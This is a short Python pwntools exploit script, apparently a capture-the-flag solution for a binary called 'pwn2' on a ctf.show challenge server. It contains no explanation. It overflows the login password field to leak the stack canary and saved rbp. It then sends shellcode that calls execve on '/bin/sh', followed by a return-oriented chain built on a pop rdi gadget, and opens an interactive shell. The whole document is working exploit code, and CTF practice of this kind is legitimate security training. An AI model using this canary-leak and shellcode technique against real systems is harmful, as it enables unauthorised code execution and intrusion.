from pwn import *
from LibcSearcher import *

# p=process('./pwn2')
p=remote('pwn.challenge.ctf.show',28148)
elf=ELF('./pwn2')
libc=ELF('/home/cutecabbage/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6')
context(arch='amd64',os='linux')

pop_rdi=0x00000000004015f3
context.log_level=True
def login(name,passwd):
    p.recvuntil(b'name:       ')
    p.sendline(name)
    p.recvuntil(b'password:   ')
    p.sendline(passwd)

login(b'cat_loves_her',b'b'*0x19)
pause()
p.recvuntil(b'the password '+b'b'*0x19)
canary=u64(p.recv(7).rjust(8,b'\x00'))
log.success('canary: '+hex(canary))
rbp=u64(p.recv(6).ljust(8,b'\x00'))
log.success('rbp: '+hex(rbp))
print(p.recv())
shellcode=asm('xor rax,rax;add rax,0x3b;xor rsi,rsi;xor rdx,rdx;syscall')
print(shellcode,len(shellcode))
pause()
payload=b'/bin/sh\x00'+shellcode
payload=payload.ljust(0x18,b'\x00')
print(payload)
payload+=p64(canary)+p64(rbp)+p64(pop_rdi)+p64(rbp-0x30)+p64(rbp-0x30+8)
p.sendline(payload)
p.interactive()